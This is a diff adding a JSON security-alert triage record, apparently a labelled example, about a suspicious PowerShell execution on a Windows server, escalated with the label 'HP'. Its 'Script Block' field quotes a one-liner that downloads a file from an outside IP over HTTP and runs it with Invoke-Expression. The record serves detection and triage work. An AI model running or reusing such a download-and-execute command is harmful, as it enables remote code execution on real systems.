@@ -1,0 +1,18 @@
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-9471",
+    "Start Time": "2026-01-26T03:42:18.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.2.60.77",
+    "Destination IP": "185.199.88.22",
+    "Endpoint": "SRV-APP-03",
+    "User": "a.petrov",
+    "Description": "A PowerShell script executed on SRV-APP-03 that downloaded content from 185.199.88.22 over unencrypted HTTP and executed it using Invoke-Expression (IEX). This behavior results in remote code execution on a server and is high-risk given the execution pattern, lack of user directory verification, and absence of recent related activity or events. Although the destination IP shows a low abuse score, the download-and-IEX pattern on a production server justifies escalation for further investigation.",
+    "Script Block": "$u='http://185.199.88.22/update.bin';$b=Invoke-WebRequest -Uri $u -UseBasicParsing;IEX ([Text.Encoding]::UTF8.GetString($b.Content))",
+    "Operating System": "Windows Server 2022 Datacenter",
+    "Destination IP Reputation": "Abuse Confidence Score: 0/100; ISP: KKB KREDI KAYIT BUROSU ANONIM SIRKETI; Usage Type: Commercial",
+    "Recent Similar Alerts": "None found",
+    "User Directory Lookup": "No matching internal email found for a.petrov"
+  },
+  "classification": "HP"
+}
